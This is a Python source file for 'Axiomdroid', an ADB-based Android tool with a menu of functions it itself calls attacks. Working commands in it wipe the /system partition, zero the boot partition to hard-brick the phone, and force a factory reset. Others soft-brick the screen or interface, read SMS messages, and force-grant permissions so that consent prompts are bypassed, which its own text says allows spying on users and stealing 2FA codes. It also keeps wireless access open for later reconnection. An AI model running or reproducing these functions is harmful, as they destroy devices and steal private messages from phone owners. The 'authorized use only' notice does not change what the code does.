import subprocess
import sys
from colorama import  Fore, Style, init
import time

init(autoreset=True)
path = "platform-tools-latest-linux/platform-tools"
ascii_art = r"""
                                                                        Axiomdroid v1.0
         ▄▄▄      ▒██   ██▒ ██▓ ▒█████   ███▄ ▄███▓▓█████▄  ██▀███   ▒█████   ██▓▓█████▄ 
        ▒████▄    ▒▒ █ █ ▒░▓██▒▒██▒  ██▒▓██▒▀█▀ ██▒▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒▓██▒▒██▀ ██▌
        ▒██  ▀█▄  ░░  █   ░▒██▒▒██░  ██▒▓██    ▓██░░██   █▌▓██ ░▄█ ▒▒██░  ██▒▒██▒░██   █▌
        ░██▄▄▄▄██  ░ █ █ ▒ ░██░▒██   ██░▒██    ▒██ ░▓█▄   ▌▒██▀▀█▄  ▒██   ██░░██░░▓█▄   ▌
         ▓█   ▓██▒▒██▒ ▒██▒░██░░ ████▓▒░▒██▒   ░██▒░▒████▓ ░██▓ ▒██▒░ ████▓▒░░██░░▒████▓ 
         ▒▒   ▓▒█░▒▒ ░ ░▓ ░░▓  ░ ▒░▒░▒░ ░ ▒░   ░  ░ ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▓   ▒▒▓  ▒ 
          ▒   ▒▒ ░░░   ░▒ ░ ▒ ░  ░ ▒ ▒░ ░  ░      ░ ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░ ░ ▒  ▒ 
          ░   ▒    ░    ░   ▒ ░░ ░ ░ ▒  ░      ░    ░ ░  ░   ░░   ░ ░ ░ ░ ▒   ▒ ░ ░ ░  ░  By Baggyunittechs"""
class Action:
    def execute(self):
        raise NotImplementedError("subclasses must use execute()")

class LiveScreen(Action):
    def execute(self):
        subprocess.run(["scrcpy"])
        return Fore.LIGHTGREEN_EX + "[-]Success ..." + Style.RESET_ALL

class Screenshot(Action):
    def execute(self):
        subprocess.run([f"{path}/adb", "shell", "screencap", "/sdcard/screenshot.png"])
        subprocess.run([f"{path}/adb", "pull", "/sdcard/screenshot.png"], stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True)
        return "    [-] Screenshot saved in current directory.."

class ScreenRecord(Action):
    def execute(self):
        try:
            while True:
                print( Fore.LIGHTYELLOW_EX + "\n    [-] Click crtl + c when done screen recording" + Style.RESET_ALL)
                subprocess.run([f"{path}/adb", "shell", "screenrecord", "/sdcard/screenrecord.mp4"])

        except KeyboardInterrupt:
            subprocess.run([f"{path}/adb", "pull", "/sdcard/screenrecord.mp4"])
            return  Fore.LIGHTGREEN_EX + "    [-] Screenrecord saved in current directory" + Style.RESET_ALL

class DeleteOs(Action):
    def execute(self):
        print( Fore.LIGHTWHITE_EX + """
    [-] This removes the operating system itself. The phone will never boot again until the 
         OS is manually re-flashed using external tools (like Fastboot or Odin)
         """ + Style.RESET_ALL)

        confirm = input( Fore.LIGHTGREEN_EX + "    >> Do you want to continue [y or n]: ").lower().split()
        if "y" in confirm:
            subprocess.run([f"{path}/adb", "shell", "su", "-c", "rm -rf /system"])
        elif "n" in confirm:
            return Fore.LIGHTYELLOW_EX + "\n    [-] EXITING ..." + Style.RESET_ALL
        else:
            return Fore.LIGHTRED_EX + "\n    [-] INVALID OPTION"

class HardBrick(Action):
    def execute(self):
        print(Fore.LIGHTWHITE_EX + """
    [-] This corrupts the boot partition, leaving the device completely dead 
        (often requiring deep-level repair tools like JTAG or EDL mode to fix)."""  + Style.RESET_ALL)
        confirm = input(Fore.LIGHTGREEN_EX + "    [-] Do you want to continue? [y or n]: ").lower().split()
        if "y" in confirm:
            subprocess.run([f"{path}/adb", "shell", "dd", "if=/dev/zero", "of=/dev/block/bootdevice/by-name/boot"])
        elif "n" in confirm:
            return Fore.LIGHTYELLOW_EX + "\n    [-] EXITING ..."
        else:
            return Fore.LIGHTRED_EX + "\n    [-] INVALID OPTION"

class UploadFile(Action):
    def execute(self):
        print("""
    [-] This a file/folder into the device from your pc. Make sure you have the right file/folder path
        """)
        file = input(Fore.LIGHTGREEN_EX + "    [>>] Enter File Path: ")
        if file:
            subprocess.run([f"{path}/adb", "push", f"{file}", "/sdcard/"])
        else:
            return Fore.LIGHTRED_EX + """    
    [-] Invalid file path
    [-] Try again
            """

class FactoryReset(Action):
    def execute(self):
        print("    [-] This Erases/Resets device data,installed apps and files. Ensure a BACKUP")
        print("    [-] Triggers a factory reset immediately upon reboot.")
        confirm = input(Fore.LIGHTGREEN_EX + "    [-]Do yo want to continue? [y or n]: ").lower().split()
        if "y" in confirm:
            subprocess.run([f"{path}/adb", "shell", "recovery", "--wipe_data"])
            return "    [-] TIP: You use this tool to reboot the device immediately or reboot manualy from the device"
        elif "n" in confirm:
            return Fore.LIGHTYELLOW_EX + "    [-] EXITING ..."
        else:
            return Fore.LIGHTRED_EX + "    [-] INVALID OPTION"


class NormalReboot(Action):
    def execute(self):
        print("    [-] This makes the device reboot normally")
        print("    [-] This also disconnects you from the device !!\n")
        confirm = input(Fore.LIGHTGREEN_EX + "    [>>] Do want to continue? [y or n]: ").lower().split()
        if "y" in confirm:
            subprocess.run([f"{path}/adb", "reboot"])
            return Fore.LIGHTGREEN_EX + "\n    [-] Device now rebooting.."
        elif "n" in confirm:
            return Fore.LIGHTYELLOW_EX + " \n   [-] Exiting the attack"
        else:
            return Fore.LIGHTRED_EX + "\n    [-]INVALID OPTION"


class FileDownload(Action):
    def execute(self):
        print("    [-] This downloads a file from the device Download folder\n")
        subprocess.run([f"{path}/adb", "shell", "cd","/storage/emulated/0/Download"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                     text=True)
        file = input( Fore.LIGHTGREEN_EX + "Copy any filename from the list and paste it here: ")
        if file:
            subprocess.run([f"{path}/adb", "pull", f"/sdcard/{file}"])
        else:
            return {
                "Error": "INVALID FILE PATH",
                "Message": "TRY AGAIN WITH THE CORRECT FILE PATH.."
            }

class FontResize(Action):
    def execute(self):
        print("""
    [-] Changes the font size to 1000% of normal. 
    Text becomes so massive that single letters fill the screen, 
    making it impossible to navigate settings to fix it
        """)
        print("""
    [1.] Launch this Attack
    [2.] Rescue a Device affected From this Attack
    [3.] Exit 
        """)
        res = int(input(Fore.LIGHTGREEN_EX + "    [>>]your option [1 or 2]: "))
        if res == 1:
            subprocess.run([f"{path}/adb", "shell", "settings", "put", "system", "font_scale", "10.0"])
            return Fore.LIGHTGREEN_EX + "    [-] FontResize Done"
        elif res == 2:
            subprocess.run([f"{path}/adb", "shell", "settings", "put", "system", "font_scale", "1.0"])
            return Fore.LIGHTGREEN_EX + "Font-default set DONE!!"
        elif res == 3:
            print("    [-] Exiting the Attack")
            sys.exit()
        else:
            return Fore.LIGHTRED_EX + "Invalid OPTION"

class WizardSetup(Action):
    def execute(self):
        print("""
    [-] This Action tell Android that the device has never been set up. It forces the phone back into the "Welcome" wizard. 
        If you have apps installed, the wizard often crashes in a loop, soft-bricking the phone.
        """)
        print(Fore.LIGHTBLUE_EX + """
    [1.] Launch this Attack
    [2.] Rescue a Device affected From this Attack
    [3.] Exit
        """)
        res = int(input(Fore.LIGHTGREEN_EX + "    [>>] your option [1,2 or 3]: "))
        if res == 1:
            subprocess.run([f"{path}/adb", "shell", "settings", "secure", "user_setup_complete", "0"])
            subprocess.run([f"{path}/adb", "shell", "settings", "put", "global", "device_provisioned", "0"])
            return Fore.LIGHTGREEN_EX + "\n    [-] SETUP-WIZARD ATTACK DONE"
        elif res == 2:
            subprocess.run([f"{path}/adb", "shell", "settings", "secure", "user_setup_complete", "1"])
            subprocess.run([f"{path}/adb", "shell", "settings", "put", "global", "device_provisioned", "1"])
            return Fore.LIGHTGREEN_EX + "\n    [-] SETUP-WIZARD RESCUE DONE" + Style.RESET_ALL
        elif res == 3:
            print("\n    [-]Exiting the Attack")
            sys.exit()
        else:
            return Fore.LIGHTRED_EX + "    [-] Invalid OPTION"


class PackageInstallation(Action):
    def execute(self):
        file = input(Fore.LIGHTGREEN_EX + "    [-]Enter your APK File Path: ")
        if file:
            done1 = subprocess.run([f"{path}/adb", "push", f"{file}", "/sdcard/"],stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
            done = subprocess.run([f"{path}/adb", "install", f"{file}"],stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
            if done.stdout and done1.stdout:
                return "\n    [-] App successfully installed"
            else:
                return f"\n    [-] {done.stderr},{done1.stderr}"

class WipeApp(Action):
    def execute(self):
        print("""
    [-] This clears data, cache, and databases for a specific app. Device instantly lose all chat logs, login sessions, 
        and saved preferences for that application. It is irreversible.
        """)
        apps = subprocess.run([f"{path}/adb", "shell", "pm", "list", "packages"], stderr=subprocess.PIPE,
                              stdout=subprocess.PIPE, text=True)
        print(Fore.GREEN + apps.stdout + Style.RESET_ALL)
        option = input("    [>>] Paste package-name here(eg. com.whatsapp): ")
        clear = subprocess.run([f"{path}/adb", "shell", "pm", "clear", f"{option}"], stderr=subprocess.PIPE,
                               stdout=subprocess.PIPE, text=True)
        if not clear.stderr:
            return "\n    [-]",clear.stdout
        else:
            return "\n    [-] App not found >> " + clear.stderr


class UninstallPackage(Action):
    def execute(self):
        print("[-] This Uninstalls INSTALLED applications ONLY")
        print("[-] Below are the apps installed on the device")
        apps = subprocess.run([f"{path}/adb", "shell", "pm", "list", "packages"], stderr=subprocess.PIPE,
                              stdout=subprocess.PIPE, text=True)
        print(Fore.GREEN + apps.stdout + Style.RESET_ALL)
        option = input("    [-] Paste package-name here(eg. com.whatsapp): ")
        clear = subprocess.run([f"{path}/adb", "shell", "pm", "uninstall", f"{option}"], stderr=subprocess.PIPE,
                               stdout=subprocess.PIPE, text=True)
        if not clear.stderr:
            print("\n    [-]", clear.stdout)
            return "\n    [-] App data/cache has been wiped"
        else:
            return "\n    [-] App not found"


class ListPackages(Action):
    def execute(self):
        print("[-] Below are the apps installed on the device")
        apps = subprocess.run([f"{path}/adb", "shell", "pm", "list", "packages"], stderr=subprocess.PIPE,
                              stdout=subprocess.PIPE, text=True)
        print(Fore.GREEN + apps.stdout + Style.RESET_ALL)


class CustomResolution(Action):
    def execute(self):
        print("""
    [-] Setting a resolution unsupported by the hardware can turn the screen black or 
        make touch inputs register in the wrong locations, making it nearly
        impossible to fix without a physical keyboard or memorized rescue commands.
        """)
        print("""
    [1.] Launch this Attack
    [2.] Rescue a Device affected From this Attack
    [3.] Exit
                """)
        res = int(input("    [-] your option [1 or 2]: "))
        if res == 1:
            subprocess.run([f"{path}/adb", "shell", "wm", "size", "5000x5000"])
        elif res == 2:
            subprocess.run([f"{path}/adb", "shell", "wm", "size", "reset"])
            return "    [-] Resolution reset back to normal"
        elif res == 3:
            return "\n    [-] Exiting the Attack"

        else:
            return "\n    [-] INVALID OPTION"

class PixelDensity(Action):
    def execute(self):
        print("""
    [-] This can cause the System UI (buttons, notification shade, launcher) 
        to crash repeatedly ("Force Close" loop), locking you out of the phone.
        """)
        print("""
    [1.] Launch this Attack
    [2.] Rescue a Device affected From this Attack
    [3.] Exit
                        """)
        res = int(input("    [-] your option [1 or 2]: "))
        if res == 1:
            subprocess.run([f"{path}/adb", "shell", "wm", "density", "600"])
            return "\n    [-] Device set to 600 DPI"
        elif res == 2:
            subprocess.run([f"{path}/adb", "shell", "wm", "density", "reset"])
            return "\n    [-] Device set back to default DPI"
        elif res == 3:
            return "\n    [-] Exiting the Attack"

        else:
            return "\n    [-] INVALID OPTION"


class SystemInfo(Action):
    def execute(self):
        storage = subprocess.run([f"{path}/adb", "shell", "df", "-h"], stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                                 text=True)

        ram = subprocess.run([f"{path}/adb", "shell", "free", "-h"], stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                             text=True)
        print(storage.stdout)
        print("RAM")
        print(ram.stdout)

class RebootRecovery(Action):
    def execute(self):
        print("""
    [-] This reboots the device into recovery mode. Gets you disconnected from the device.
        """)
        subprocess.run([f"{path}/adb", "reboot", "recovery"])
        return "    [-] Device rebooting now !"


class RebootFatstboot(Action):
    def execute(self):
        print("""
    [-] This reboots Device into bootloader/FASTBOOT
        """)
        subprocess.run([f"{path}/adb", "reboot", "bootloader"])
        return "    [-] Device Rebooting now"


class ForcePermissions(Action):
    def execute(self):
        print("""
    [-] Forcefully grants sensitive permissions to an app (e.g., granting Location or SMS access to a rogue app).
        This bypasses the user consent dialogs, potentially allowing malware to spy on the user or steal 2FA 
        codes without the user ever clicking "Allow."
        """)
        app_name = input("    [-] Enter the package/app name eg com.whatsapp: ")
        permission = input("    [-] Enter permission name eg Location: ")
        if app_name and permission:
            subprocess.run([f"{path}/adb", "shell", "appops", "set", f"{app_name}", f"{permission}", "allow"])
        else:
            return "\n    [-] FAILED DUE TO INVALID APP NAME OR PERMISSION"

class ReadSms(Action):
    def execute(self):
        print("""
    [-] This reads and displays the first 7 sms/google messages:
        Tested and works on android 13 and below. May not work on samsung due to security hardening.
        """)
        subprocess.run([f"{path}/adb", "shell",
                              "content query --uri content://sms/ --projection address:date:body | head -n 8 | sed 'G'"])

class KillUI(Action):
    def execute(self):
        print("""
    [-] This kills the status bar, the notification shade, and the navigation buttons 
        (Home/Back/Recents). This simply removes the entire interface. You will see your wallpaper and nothing else.
        """)
        print(Fore.LIGHTBLUE_EX + """
    [1.] Launch this Attack
    [2.] Rescue a Device affected From this Attack
    [3.] Exit
                                """)
        res = int(input("   [>>] your option [1,2 OR 3]: "))
        if res == 1:
            subprocess.run([f'{path}/adb', "shell", "pm", "disable-user", "com.android.systemui"])
            return "\n    [-] DONE. SYSTEMUI DISABLED!!"
        elif res == 2:
            subprocess.run([f'{path}/adb', "shell", "pm", "enable", "com.android.systemui"])
            return "\n    [-] DONE. SYSTEMUI RESTORED TO DEFAULT!!"
        elif res == 3:
            return "\n    [-] Exiting the attack ..."
        else:
            return "\n    [-] INVALID OPTION, TRY AGAIN LATER"


class OpenShell(Action):
    def execute(self):
        print("""
    [-] is a command-line tool that acts as a direct "portal" to the inner workings of the Android operating system. 
        While standard Android allows you to interact with apps via a touchscreen,
        adb shell lets you talk to the phone using the Linux command line.

    [-] This is specifically made for pros who understands ADB commands and Linux commands only
    [-] Type exit to exit the shell/command line
        """)
        subprocess.run([f"{path}/adb", "shell"])


class Exit(Action):
    def execute(self):
        print("\n    [-] Exiting..")
        sys.exit()


class Help(Action):
    def execute(self):
        return """
        ADB Automation Tool – Quick User Guide
        Educational and Authorized Use Only

        Important Notice
        This tool uses Android Debug Bridge (ADB).
        Use it only on devices you own or have permission to use.
        Unauthorized or malicious use may violate privacy laws.

        Requirements
        - Android phone
        - USB cable (required for first-time setup)
        - ADB installed
        - Developer Options enabled

        Step 1: Enable Developer Options
        1. Settings → About phone
        2. Tap Build number 7 times
        3. Developer Options will be unlocked

        Step 2: Enable USB Debugging
        1. Settings → Developer Options
        2. Enable USB Debugging
        3. (Optional) Enable Wireless Debugging

        Step 3: First-Time USB Authorization (Required Once)
        1. Connect phone to PC via USB
        2. Unlock phone screen
        3. Run the tool
        4. When prompted, allow USB debugging and select Always allow

        This step is mandatory even if you plan to use wireless or IP mode later.

        Running the Tool (Connection Modes)

        USB Mode
        - Keep USB connected
        - Run the tool and select USB mode
        - Recommended for first-time users

        Wireless Mode
        - Phone and PC must be on the same Wi-Fi
        - USB authorization must already be done
        - Run the tool and select Wireless mode

        IP Mode
        - For advanced users
        - USB authorization must have been completed earlier
        - Enter the phone’s local IP address when prompted

        Security Notes
        - Disable USB Debugging after use
        - Avoid public networks
        - Revoke USB debugging authorizations if the phone is shared

        Troubleshooting
        - Device not detected: unlock phone, reconnect USB, re-enable debugging
        - Unauthorized: revoke authorizations and reconnect USB
        - Wireless/IP fails: ensure same network and prior USB authorization
        """

action_map = {
    "1": LiveScreen,
    "2": Screenshot,
    "3": ScreenRecord,
    "4": DeleteOs,
    "5": HardBrick,
    "6": UploadFile,
    "7": FactoryReset,
    "8": NormalReboot,
    "9": FileDownload,
    "10": FontResize,
    "11": WizardSetup,
    "12": PackageInstallation,
    "13": WipeApp,
    "14": UninstallPackage,
    "15": ListPackages,
    "16": CustomResolution,
    "17": PixelDensity,
    "18": SystemInfo,
    "19": RebootRecovery,
    "20": RebootFatstboot,
    "21": ForcePermissions,
    "22": ReadSms,
    "23": KillUI,
    "24": OpenShell,
    "25": Help,
    "00": Exit
}

def menu():
    print(Fore.RED + f"{ascii_art}\n")
    print(f"""
    [1.]  {Fore.LIGHTGREEN_EX}Live screen{Style.RESET_ALL}                         [13.] {Fore.LIGHTGREEN_EX}Wipe data/cache of an app{Style.RESET_ALL}                         
    [2.]  {Fore.LIGHTGREEN_EX}Take a screenshot{Style.RESET_ALL}                   [14.] {Fore.LIGHTGREEN_EX}Uninstall a package/app{Style.RESET_ALL}                          
    [3.]  {Fore.LIGHTGREEN_EX}screen record{Style.RESET_ALL}                       [15.] {Fore.LIGHTGREEN_EX}List installed packages/apps{Style.RESET_ALL}                      
    [4.]  {Fore.LIGHTGREEN_EX}Remove/delete OS (ROOT REQUIRED){Style.RESET_ALL}    [16.] {Fore.LIGHTGREEN_EX}Set a custom resolution{Style.RESET_ALL}
    [5.]  {Fore.LIGHTGREEN_EX}Hard brick Device (ROOT REQUIRED){Style.RESET_ALL}   [17.] {Fore.LIGHTGREEN_EX}Change pixel density{Style.RESET_ALL}
    [6.]  {Fore.LIGHTGREEN_EX}Upload a file{Style.RESET_ALL}                       [18.] {Fore.LIGHTGREEN_EX}Show system/device information{Style.RESET_ALL}
    [7.]  {Fore.LIGHTGREEN_EX}Factory reset device{Style.RESET_ALL}                [19.] {Fore.LIGHTGREEN_EX}Reboot into recovery mode{Style.RESET_ALL}
    [8.]  {Fore.LIGHTGREEN_EX}Normal Reboot{Style.RESET_ALL}                       [20.] {Fore.LIGHTGREEN_EX}Reboot into bootloader/fastboot{Style.RESET_ALL}
    [9.]  {Fore.LIGHTGREEN_EX}Download a file{Style.RESET_ALL}                     [21.] {Fore.LIGHTGREEN_EX}Forcefully grant sensitive permissions to an app{Style.RESET_ALL}
    [10.] {Fore.LIGHTGREEN_EX}Resize font size to 1000%{Style.RESET_ALL}           [22.] {Fore.LIGHTGREEN_EX}Read SMS{Style.RESET_ALL}
    [11.] {Fore.LIGHTGREEN_EX}Force device back to setup wizard{Style.RESET_ALL}   [23.] {Fore.LIGHTGREEN_EX}Disable SystemUI{Style.RESET_ALL}
    [12.] {Fore.LIGHTGREEN_EX}Install a package/app{Style.RESET_ALL}               [24.] {Fore.LIGHTGREEN_EX}Open shell/command prompt{Style.RESET_ALL}
    
    [00.] {Fore.LIGHTRED_EX}EXIT{Style.RESET_ALL}      [25.]: {Fore.LIGHTGREEN_EX}Help{Style.RESET_ALL} 
    """ + Style.RESET_ALL)
    choices = input(Fore.RED + "    [-] Select an option: " + Style.RESET_ALL)
    if choices in action_map:
        action = action_map[choices]()
        print(action.execute())
    else:
        print(Fore.RED + "Invalid choice" + Style.RESET_ALL)
        sys.exit()

def wireless():
    subprocess.run([f"{path}/adb", "kill-server"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    subprocess.run([f"{path}/adb", "start-server"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    results = subprocess.run([f"{path}/adb", "devices"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    results1 = subprocess.run([f"{path}/adb", "shell", "ip", "route"], stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                              text=True)
    subprocess.run([f"{path}/adb", "tcpip", "5555"], stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                   text=True)
    if "device" in results.stdout.split():
        text2 = "[+]. Device found ..."
        text3 = "[+]. You may unplug the device ....\n"
        for char in text2:
            print(Fore.YELLOW + char, end="", flush=True)
            time.sleep(0.02)
        print()
        for char in text3:
            print(Fore.GREEN + char, end="", flush=True)
            time.sleep(0.02)
        print()

        unplug = input(Fore.BLUE + "[>>] unpugged cable? y or n: ").lower().split()

        if "y" in unplug:
            ress1 = results1.stdout.split()
            ipadd = ress1[-1]
            print(results1.stdout, "\n")
            print(Fore.YELLOW + f"[+]. device ip address '{ipadd}' has been captured ....")

            text2 = "[+]. opening port 5555 on the device ...."
            for char in text2:
                print(Fore.YELLOW + char, end="", flush=True)
                time.sleep(0.02)
            print()
            connekt = subprocess.run([f"{path}/adb", "connect", f"{ipadd}:5555" ], stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                           text=True)
            if "connected" in connekt.stdout:
                text2 = "[+]. connecting to the device ....."
                text3 = "[+]. wireless connection successfull ....\n"
                for char in text2:
                    print(Fore.YELLOW + char, end="", flush=True)
                    time.sleep(0.02)
                print()
                for char in text3:
                    print(Fore.GREEN + char, end="", flush=True)
                    time.sleep(0.02)
                print()
                menu()
            else:
                print(">> Failed to establish IP connections....")
                print(">> MAKE SURE THE USB CABLE IS REALLY DISCONNECTED ....")
                print(">> Proceeding to Manual IP input....")
                man_ip = input("Enter device IP address: ")
                connekt_2 = subprocess.run([f"{path}/adb", "connect", f"{man_ip}:5555"], stderr=subprocess.PIPE,
                               stdout=subprocess.PIPE,
                               text=True)
                text2 = "[+]. connecting to the device ....."
                text3 = "[+]. wireless connection successfull ....\n"
                for char in text2:
                    print(Fore.YELLOW + char, end="", flush=True)
                    time.sleep(0.02)
                print()
                for char in text3:
                    print(Fore.GREEN + char, end="", flush=True)
                    time.sleep(0.02)
                print()
                menu()

                if "failed" in connekt_2.stdout:
                    print(Fore.RED + ">>> DEVICE CONNECTION FAILED <<<" + Style.RESET_ALL)
                    print(Fore.RED + ">>> MAKE THE PHONE IS ON THE SAME CONNECTION AS THE COMPUTER <<<" + Style.RESET_ALL)
                    sys.exit()
        elif "n" in unplug:
            text2 = ">> Proceeding to USB cable connection...."
            text3 = ">> Make sure the usb cable is plugged in and usb debugging is enable on your phone ..."
            for char in text2:
                print(Fore.RED + char, end="", flush=True)
                time.sleep(0.02)
            print()
            for char in text3:
                print(Fore.YELLOW + char, end="", flush=True)
                time.sleep(0.02)
            print()
            wired()
        else:
            print(Fore.RED + ">>>> INVALID CHOICE! RESTART THE CONNECTION " + Style.RESET_ALL)
            sys.exit()
    elif not "device" in results.stdout.split():
        print(Fore.RED + "[+]. NO DEVICE DETECTED ...." + Style.RESET_ALL)
        print(Fore.RED + "[+]. MAKE SURE DEVICE IS ON SAME NETWORK AS YOUR COMPUTER..." + Style.RESET_ALL)
        sys.exit()

def wired():
    subprocess.run([f"{path}/adb", "kill-server"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    subprocess.run([f"{path}/adb", "start-server"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    print(Fore.GREEN + "\n[+] starting adb server ....")
    wired_conn = subprocess.run([f"{path}/adb", "devices"], stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
    if not "device" in wired_conn.stdout.split():
        text1 = "[+] scanning devices ..."
        text2 = ">>> NO DEVICES DETECTED PLEASE MAKE SURE YOUR PHONE IS PLUGGED INTO THE COMPUTER <<<<"
        text3 = ">>> MAKE SURE USB DEBUGGING IS ENABLE ON THE PHONE'S DEVELOPER SETTINGS <<<"
        for char in text1:
            print(Fore.LIGHTBLUE_EX+ char, end="", flush=True)
            time.sleep(0.05)
        print()
        for char in text2:
            print(Fore.RED + char, end="", flush=True)
            time.sleep(0.01)
        print()
        for char in text3:
            print(Fore.RED + char, end="", flush=True)
            time.sleep(0.01)
        print()
    else:
        text4 = "[+] scanning devices ..."
        text5 = "[+] Device Found"
        text6 = "[+] Waiting for authorization ....\n"
        for char in text4:
            print(Fore.GREEN + char, end="", flush=True)
            time.sleep(0.01)
        print()
        for char in text5:
            print(Fore.GREEN + char, end="", flush=True)
            time.sleep(0.01)
        print()
        for char in text6:
            print(Fore.YELLOW + char, end="", flush=True)
            time.sleep(0.05)
        print()
        menu()
def reconnect():
    print("""
>>> This works if you recall ip address of the previously connected Device.
    TIP: Address of previously connected device is displayed before exiting the previous attack on it.
    This ensure no contact with the device. Just full wireless connection.
    NOTE:  This doesnt work if the device has never had any cable connection with your computer
""")
    addd = input(Fore.GREEN + "[>>] Please Enter Device IP address: ")
    subprocess.run([f"{path}/adb", "tcpip", "5555"], stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                   text=True)
    text2 = "[+]. opening port 5555 on the device ...."
    for char in text2:
        print(Fore.YELLOW + char, end="", flush=True)
        time.sleep(0.02)
    print()
    connekt = subprocess.run([f"{path}/adb", "connect", f"{addd}:5555"], stderr=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             text=True)
    if "connected" in connekt.stdout:
        text2 = "[+]. connecting to the device ....."
        text3 = "[+]. wireless connection successfull ....\n"
        for char in text2:
            print(Fore.YELLOW + char, end="", flush=True)
            time.sleep(0.02)
        print()
        for char in text3:
            print(Fore.GREEN + char, end="", flush=True)
            time.sleep(0.02)
        print()
        menu()
    else:
        print(connekt.stderr)
        print(Fore.RED + "\n>> Failed to establish IP connections....")
        print(Fore.RED + ">> MAKE SURE THE YOU ENTERED THE CORRECT IP ADDRESS AND DEVICE IS ON SAME NETWORK ....")

def connection_options():
    print(Fore.LIGHTBLUE_EX + """    ===== SETUP WIZARD =========
    
    [1.] Wireless connection
    [2.] USB Wired connection 
    [3.] Reconnect previously connected device with ip address\n""")
    options = input("Choose 1,2 or 3: ")
    if "1" in options:
        wireless()
    elif "2" in options:
        wired()
    elif "3" in options:
        reconnect()
    else:
        print(">>> INVALID OPTION")
        sys.exit()
connection_options()
